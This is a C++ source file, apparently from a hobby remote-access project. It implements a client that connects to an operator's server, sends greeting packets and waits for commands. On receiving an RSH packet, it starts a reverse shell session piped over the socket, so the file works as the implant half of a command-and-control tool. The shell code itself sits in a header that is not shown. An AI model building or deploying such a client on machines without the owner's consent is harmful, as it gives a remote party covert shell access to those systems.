#include <iostream>
#include <csignal>
#include "conn/ClientConn.h"
#include "protocol/SocketUtil.h"
#include "protocol/ProtocolDebug.h"
#include "remote_accsess/ReverseShell.h"
#include "protocol/PacketData.h"

ClientConn::ClientConn(const char *ip, int port) {
    clientSocketFD = createTCPIPv4Socket();
    serverAddress = createIPv4Address(ip, port);
    localAddress = createIPv4Address(clientSocketFD);
};

int ClientConn::main() {
    connectToServer();
    send();
    receive();
    return 0;
};

void ClientConn::connectToServer() {
    int result = connect(clientSocketFD, (sockaddr *) serverAddress, sizeof(struct sockaddr_in));
    if (result == 0) {
        Packet packet(CONNECT, localAddress, serverAddress);
        sendPacket(clientSocketFD, packet);
        printSerializedPacketMemory(packet.seriallize());
        printf("CONNECTED TO SERVER\n");
    } else {
        printf("ERRRO WHILE TRYING TO CONNECT TO SEVER %d\n", result);
        exit(1);
    }
};


void ClientConn::receive() {
    while (true) {
        Packet packet;
        int status = recvPacket(clientSocketFD, &packet);;
        if (status != 0) {
            printf("error while recvPacket %d", status);
            break;
        }
        handlePacket(packet);
    }
};

void ClientConn::handlePacket(Packet packet) {
    switch (packet.getType()) {
        case (MSG):
            handleMsg(packet);
            break;
        case (RSH):
            startRSHSessionPipe(clientSocketFD);
            break;
        default:
            printf("got undefiend packet: %d", packet.getType());
            break;
    }
}


void ClientConn::handleMsg(Packet packet) {
    switchPacketSrcDst(packet);
    sendPacket(clientSocketFD,packet);
    printf("sent to admin\n");
}



void ClientConn::send() {
    char msg[]{"hello from client :)"};
    MsgData msgData(msg);
    Packet p1(MSG, createIPv4Address(clientSocketFD), serverAddress, msgData.serialized(), msgData.dataLength);
    printf("sending packets\n");
    sendPacket(clientSocketFD,p1);
    sendPacket(clientSocketFD,p1);
    sendPacket(clientSocketFD,p1);
    sendPacket(clientSocketFD,p1);
};